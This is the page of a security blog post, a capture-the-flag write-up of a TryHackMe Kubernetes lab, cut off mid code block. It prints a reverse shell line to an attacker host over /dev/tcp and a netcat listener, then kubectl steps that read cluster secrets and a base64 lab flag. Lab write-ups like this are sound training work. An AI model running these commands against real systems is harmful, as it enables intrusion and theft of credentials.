<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="Exploiting Kubernetes through a Grafana LFI vulnerability 👨‍🔬🔎💉" /><meta property="og:locale" content="en" /><meta name="description" content="A blog for CTF writeups, Cyber Security &amp; Defense (Blue) Team Techniques, other side projects and research by Oaker Min (Bruce)." /><meta property="og:description" content="A blog for CTF writeups, Cyber Security &amp; Defense (Blue) Team Techniques, other side projects and research by Oaker Min (Bruce)." /><link rel="canonical" href="https://brootware.github.io/posts/exploiting-kubernetes-through-a-grafana-lfi-vulnerability/" /><meta property="og:url" content="https://brootware.github.io/posts/exploiting-kubernetes-through-a-grafana-lfi-vulnerability/" /><meta property="og:site_name" content="(B)rootware Research" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-02-25T11:49:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Exploiting Kubernetes through a Grafana LFI vulnerability 👨‍🔬🔎💉" /><meta name="twitter:site" content="@brootware" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"dateModified":"2022-03-03T20:19:54+08:00","datePublished":"2022-02-25T11:49:00+08:00","description":"A blog for CTF writeups, Cyber Security &amp; Defense (Blue) Team Techniques, other side projects and research by Oaker Min (Bruce).","mainEntityOfPage":{"@type":"WebPage","@id":"https://brootware.github.io/posts/exploiting-kubernetes-through-a-grafana-lfi-vulnerability/"},"url":"https://brootware.github.io/posts/exploiting-kubernetes-through-a-grafana-lfi-vulnerability/","@type":"BlogPosting","headline":"Exploiting Kubernetes through a Grafana LFI vulnerability 👨‍🔬🔎💉","@context":"https://schema.org"}</script><title>Exploiting Kubernetes through a Grafana LFI vulnerability 👨‍🔬🔎💉 | (B)rootware Research</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="(B)rootware Research"><meta name="application-name" content="(B)rootware Research"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://avatars.githubusercontent.com/u/7734956?v=4" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">(B)rootware Research</a></div><div class="site-subtitle font-italic">Cloud DevOps / Site Reliability Engineering, Cyber Security</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/brootware" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/brootware" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="https://linkedin.com/in/oakermin" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Exploiting Kubernetes through a Grafana LFI vulnerability 👨‍🔬🔎💉</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Exploiting Kubernetes through a Grafana LFI vulnerability 👨‍🔬🔎💉</h1><div class="post-meta text-muted"><div> By <em> <a href="https://github.com/brootware">Oaker Min (Bruce)</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" date="2022-02-25 11:49:00 +0800" data-toggle="tooltip" data-placement="bottom" title="Fri, Feb 25, 2022, 11:49 AM +0800" >Feb 25, 2022</em> </span> <span> Updated <em class="timeago" date="2022-03-03 20:19:54 +0800 " data-toggle="tooltip" data-placement="bottom" title="Thu, Mar 3, 2022, 8:19 PM +0800" >Mar 3, 2022</em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2740 words"> <em>15 min</em> read</span></div></div></div><div class="post-content"><p><img data-src="https://img.shields.io/badge/completed-insecure--kube-bright%20green" data-proofer-ignore></p><h2 id="category">Category<a href="#category" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Cloud-Security, Kubernetes Security, LFI vulnerability</p><h2 id="introduction">Introduction<a href="#introduction" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>Securing kubernetes cluster is a monumental task. There are a lot of things that needs to be considered for properly securing and hardening the different components within a cluster. Luckily there is a simple guide on securing <a href="https://kubernetes.io/docs/concepts/security/overview/">Kubernetes in the context of Cloud Native Security</a> that augments the <a href="https://en.wikipedia.org/wiki/Defense_in_depth_(computing)">defense in depth</a> computing approach to security, which is widely regarded as a best practice for securing software systems.</p><p><img data-src="https://d33wubrfki0l68.cloudfront.net/50846f7aa12f39c374f4e5ace769efe26a92f7d7/8fe83/images/docs/4c.png" alt="layers" data-proofer-ignore></p><blockquote><p><em>Each layer of the Cloud Native security model builds upon the next outermost layer. The Code layer benefits from strong base (Cloud, Cluster, Container) security layers. You cannot safeguard against poor security standards in the base layers by addressing security at the Code level.</em></p></blockquote><p>Simply put, security can be thought of as 4C layers in context of cloud native security:</p><ol><li>Cloud - Following security best practices depending on your cloud provider. Things like network security, RBACS on cloud resources etc. (AWS, Azure, GCP)<li>Cluster - There are 2 key areas:<ul><li>Securing the cluster (<a href="https://kubernetes.io/docs/tasks/administer-cluster/securing-a-cluster/">https://kubernetes.io/docs/tasks/administer-cluster/securing-a-cluster/</a>)<li>Securing cluster components (Application within the cluster. Service Account RBACs, App secrets management,Pod security, Network and TLS)</ul><li>Container - Scanning container image build for OS dependency and security. Image signing and enforcement.<li>Code - Your typical code security using SAST (Static code analysis) and DAST (Dynamic code analysis).</ol><p>In this writeup, we will be focusing on Cluster application component and Container configuration security by going through <a href="https://tryhackme.com/room/insekube">TryHackme’s InseKube room</a>. For more details and securing other components, check out <a href="https://kubernetes.io/docs/concepts/security/overview/">kubernetes documentation</a>.</p><h2 id="insecure-vulnerabilities-found-on-kubernetes-cluster">Insecure Vulnerabilities found on Kubernetes cluster<a href="#insecure-vulnerabilities-found-on-kubernetes-cluster" class="anchor"><i class="fas fa-hashtag"></i></a></h2></h2><p>We are given a minikube cluster to enumerate and make our way in to find vulnerabilities and misconfigurations within a kubernetes cluster. We will start by doing a simple nmap scan.</p><h3 id="vulnerable-web-endpoint">Vulnerable web endpoint<a href="#vulnerable-web-endpoint" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>nmap scan</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
</pre><td class="rouge-code"><pre><span class="nb">sudo </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-O</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> 10.10.151.225
Password:
Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-02-24 08:50 +08
Stats: 0:08:40 elapsed<span class="p">;</span> 0 hosts completed <span class="o">(</span>1 up<span class="o">)</span>, 1 undergoing Service Scan
Service scan Timing: About 50.00% <span class="k">done</span><span class="p">;</span> ETC: 09:00 <span class="o">(</span>0:01:12 remaining<span class="o">)</span>
Nmap scan report <span class="k">for </span>10.10.151.225
Host is up <span class="o">(</span>0.18s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 65533 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   3072 9f:ae:04:9e:f0:75:ed:b7:39:80:a0:d8:7f:bd:61:06 <span class="o">(</span>RSA<span class="o">)</span>
|   256 cf:cb:89:62:99:11:d7:ca:cd:5b:57:78:10:d0:6c:82 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 5f:11:10:0d:7c:80:a3:fc:d1:d5:43:4e:49:f9:c8:d2 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http
|_http-title: Site doesn<span class="s1">'t have a title (text/html; charset=utf-8).
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Date: Thu, 24 Feb 2022 00:57:42 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 1196
|     Connection: close
|     &lt;!DOCTYPE html&gt;
|     &lt;head&gt;
|     &lt;link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"
|     integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous"&gt;
|     &lt;style&gt;
|     body,
|     html {
|     height: 100%;
|     &lt;/style&gt;
|     &lt;/head&gt;
|     &lt;body&gt;
|     &lt;div class="container h-100"&gt;
|     &lt;div class="row mt-5"&gt;
|     &lt;div class="col-12 mb-4"&gt;
|     class="text-center"&gt;Check if a website is down 
|     &lt;/h3&gt;
|     &lt;/div&gt;
|     &lt;form class="col-6 mx-auto" action="/"&gt;
|     &lt;div class=" input-group"&gt;
|     &lt;input name="hostname" value="" type="text" class="form-control" placeholder="Hostname"
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 405 Method Not Allowed
|     Date: Thu, 24 Feb 2022 00:57:43 GMT
|     Content-Type: text/plain; charset=utf-8
|     Content-Length: 18
|     Allow: GET, HEAD
|     Connection: close
|_    Method Not Allowed
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 572.71 seconds
</span></pre></table></code></div></div><p>From the scan we can see that 2 ports are open SSH and Web. By visiting the web page we can see that there is a text field that is vulnerable to Local File Inclusion(LFI).</p><p><img data-src="https://bn1304files.storage.live.com/y4mAjC-FSwN73Osczp3_-47n_4lv7br_KMALr8ItXdksJ_-j9F5xUd5W3aj80aU6-IcU4op6v0JJARpTFUW0uXM_VOrKZK-GmMXLqt7tMTdS4VKzQDq6xayyP6NGsLyBzvpF-vlwqAl7w7c5dBQvg8MQvcRK5TeDTfd6vOR7S8XM69_e9Fx_MlKHB7NoT9iJUcY?width=2858&amp;height=712&amp;cropmode=none" alt="LFI" data-proofer-ignore></p><p>From here we can get a reverse shell using <a href="https://revshells.com">https://revshells.com</a>. On your attack machine</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nc <span class="nt">-lvnp</span> 4444
</pre></table></code></div></div><p>On the target host</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sh <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/[attackmachineip]/4444 0&gt;&amp;1
</pre></table></code></div></div><h3 id="interacting-with-kubernetes">Interacting with kubernetes<a href="#interacting-with-kubernetes" class="anchor"><i class="fas fa-hashtag"></i></a></h3></h3><p>Once you got a reverse shell we can start enumerating by interacting with kubernetes. To do that, we need to download <code class="language-plaintext highlighter-rouge">kubectl</code> binary in to <code class="language-plaintext highlighter-rouge">/tmp</code> directory.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">cd</span> /tmp<span class="p">;</span> curl <span class="nt">-LO</span> <span class="s2">"https://dl.k8s.io/release/</span><span class="si">$(</span>curl <span class="nt">-L</span> <span class="nt">-s</span> https://dl.k8s.io/release/stable.txt<span class="si">)</span><span class="s2">/bin/linux/amd64/kubectl"</span>
</pre></table></code></div></div><p>Before going further, do check if there are any important items we should be able to find in environment variables of the web account. ;)</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre><span class="nb">env
</span><span class="nv">KUBERNETES_SERVICE_PORT_HTTPS</span><span class="o">=</span>443
<span class="nv">GRAFANA_SERVICE_HOST</span><span class="o">=</span>10.10.151.225
<span class="nv">KUBERNETES_SERVICE_PORT</span><span class="o">=</span>443
<span class="nv">HOSTNAME</span><span class="o">=</span>syringe-79b66d66d7-7mxhd
<span class="nv">SYRINGE_PORT</span><span class="o">=</span>tcp://10.99.16.179:3000
<span class="nv">GRAFANA_PORT</span><span class="o">=</span>tcp://10.10.151.225:3000
<span class="nv">SYRINGE_SERVICE_HOST</span><span class="o">=</span>10.99.16.179
<span class="nv">SYRINGE_PORT_3000_TCP</span><span class="o">=</span>tcp://10.99.16.179:3000
<span class="nv">GRAFANA_PORT_3000_TCP</span><span class="o">=</span>tcp://10.10.151.225:3000
<span class="nv">PWD</span><span class="o">=</span>/home/challenge
<span class="nv">SYRINGE_PORT_3000_TCP_PROTO</span><span class="o">=</span>tcp
<span class="nv">HOME</span><span class="o">=</span>/home/challenge
<span class="nv">KUBERNETES_PORT_443_TCP</span><span class="o">=</span>tcp://10.96.0.1:443
<span class="nv">GOLANG_VERSION</span><span class="o">=</span>1.15.7
<span class="nv">FLAG</span><span class="o">=</span>flag<span class="o">{</span>Redacted<span class="o">}</span>
<span class="nv">SHLVL</span><span class="o">=</span>1
<span class="nv">SYRINGE_PORT_3000_TCP_PORT</span><span class="o">=</span>3000
<span class="nv">GRAFANA_PORT_3000_TCP_PORT</span><span class="o">=</span>3000
<span class="nv">KUBERNETES_PORT_443_TCP_PROTO</span><span class="o">=</span>tcp
<span class="nv">KUBERNETES_PORT_443_TCP_ADDR</span><span class="o">=</span>10.96.0.1
<span class="nv">GRAFANA_SERVICE_PORT</span><span class="o">=</span>3000
<span class="nv">SYRINGE_PORT_3000_TCP_ADDR</span><span class="o">=</span>10.99.16.179
<span class="nv">SYRINGE_SERVICE_PORT</span><span class="o">=</span>3000
<span class="nv">KUBERNETES_SERVICE_HOST</span><span class="o">=</span>10.96.0.1
<span class="nv">KUBERNETES_PORT</span><span class="o">=</span>tcp://10.96.0.1:443
<span class="nv">KUBERNETES_PORT_443_TCP_PORT</span><span class="o">=</span>443
<span class="nv">GRAFANA_PORT_3000_TCP_PROTO</span><span class="o">=</span>tcp
<span class="nv">PATH</span><span class="o">=</span>/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
<span class="nv">GRAFANA_PORT_3000_TCP_ADDR</span><span class="o">=</span>10.10.151.225
<span class="nv">_</span><span class="o">=</span>/usr/bin/env
</pre></table></code></div></div><p>From the env variables above, we can see that there is a grafana service running locally that we was not opened to public from the previous nmap scan.</p><p>Once <code class="language-plaintext highlighter-rouge">kubectl</code> binary is downloaded, we can check for permissions as a web account.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre>./kubectl auth can-i <span class="nt">--list</span>
Resources                                       Non-Resource URLs                     Resource Names   Verbs
selfsubjectaccessreviews.authorization.k8s.io   <span class="o">[]</span>                                    <span class="o">[]</span>               <span class="o">[</span>create]
selfsubjectrulesreviews.authorization.k8s.io    <span class="o">[]</span>                                    <span class="o">[]</span>               <span class="o">[</span>create]
secrets                                         <span class="o">[]</span>                                    <span class="o">[]</span>               <span class="o">[</span>get list]
                                                <span class="o">[</span>/.well-known/openid-configuration]   <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/api/<span class="k">*</span><span class="o">]</span>                              <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/api]                                <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/apis/<span class="k">*</span><span class="o">]</span>                             <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/apis]                               <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/healthz]                            <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/healthz]                            <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/livez]                              <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/livez]                              <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/openapi/<span class="k">*</span><span class="o">]</span>                          <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/openapi]                            <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/openid/v1/jwks]                     <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/readyz]                             <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/readyz]                             <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/version/]                           <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/version/]                           <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/version]                            <span class="o">[]</span>               <span class="o">[</span>get]
                                                <span class="o">[</span>/version]                            <span class="o">[]</span>    
</pre></table></code></div></div><p>Kubernetes store secret values in resources called <code class="language-plaintext highlighter-rouge">secrets</code> which get mounted into pods either as environment variables or files. We can view them by using <code class="language-plaintext highlighter-rouge">./kubectl get secrets</code></p><div class="language-console highlighter-rouge"><div class="code-header"> <span label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="go">NAME                    TYPE                                  DATA   AGE
default-token-8bksk     kubernetes.io/service-account-token   3      41d
developer-token-74lck   kubernetes.io/service-account-token   3      41d
secretflag              Opaque                                1      41d
syringe-token-g85mg     kubernetes.io/service-account-token   3      41d
</span></pre></table></code></div></div><p>Notice that the type of a hidden secret is Opaque. This does not allow a user to simply get the details of the secret using <code class="language-plaintext highlighter-rouge">kubectl describe</code></p><p>To view the details of a particular secret:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="nb">cd</span> /tmp<span class="p">;</span> ./kubectl describe secret secretflag
Name:         secretflag
Namespace:    default
Labels:       &lt;none&gt;
Annotations:  &lt;none&gt;

Type:  Opaque

Data
<span class="o">====</span>
flag:  38 bytes
</pre></table></code></div></div><p>To view the secret in raw data: <code class="language-plaintext highlighter-rouge">kubectl get secret secretflag -o 'json'</code></p><div class="language-json highlighter-rouge"><div class="code-header"> <span label-text="JSON"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
    </span><span class="nl">"apiVersion"</span><span class="p">:</span><span class="w"> </span><span class="s2">"v1"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"data"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"flag"</span><span class="p">:</span><span class="w"> </span><span class="s2">"ZmxhZ3tkZjJhNjM2ZGUxNTEwOGE0ZGM0MTEzNWQ5MzBkOGVjMX0="</span><span class="w">
    </span><span class="p">},</span><span class="w">
    </span><span class="nl">"kind"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Secret"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"metadata"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
        </span><span class="nl">"annotations"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
            </span><span class="nl">"kubectl.kubernetes.io/last-applied-configuration"</span><span class="p">:</span><span class="w"> </span><span class="s2">"{</span><span class="se">\"</span><span class="s2">apiVersion</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">v1</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">data</span><span class="se">\"</span><span class="s2">:{</span><span class="se">\"</span><span class="s2">flag</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">ZmxhZ3tkZjJhNjM2ZGUxNTEwOGE0ZGM0MTEzNWQ5MzBkOGVjMX0=</span><span class="se">\"</span><span class="s2">},</span><span class="se">\"</span><span class="s2">kind</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">Secret</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">metadata</span><span class="se">\"</span><span class="s2">:{</span><span class="se">\"</span><span class="s2">annotations</span><span class="se">\"</span><span class="s2">:{},</span><span class="se">\"</span><span class="s2">name</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">secretflag</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">namespace</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">default</span><span class="se">\"</span><span class="s2">},</span><span class="se">\"</span><span class="s2">type</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">Opaque</span><span class="se">\"</span><span class="s2">}</span><span class="se">\n</span><span class="s2">"</span><span class="w">
        </span><span class="p">},</span><span class="w">
        </span><span class="nl">"creationTimestamp"</span><span class="p">:</span><span class="w"> </span><span class="s2">"2022-01-06T23:41:19Z"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"name"</span><span class="p">:</span><span class="w"> </span><span class="s2">"secretflag"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"namespace"</span><span class="p">:</span><span class="w"> </span><span class="s2">"default"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"resourceVersion"</span><span class="p">:</span><span class="w"> </span><span class="s2">"562"</span><span class="p">,</span><span class="w">
        </span><span class="nl">"uid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"6384b135-4628-4693-b269-4e50bfffdf21"</span><span class="w">
    </span><span class="p">},</span><span class="w">
    </span><span class="nl">"type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Opaque"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="code-header"> <span label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
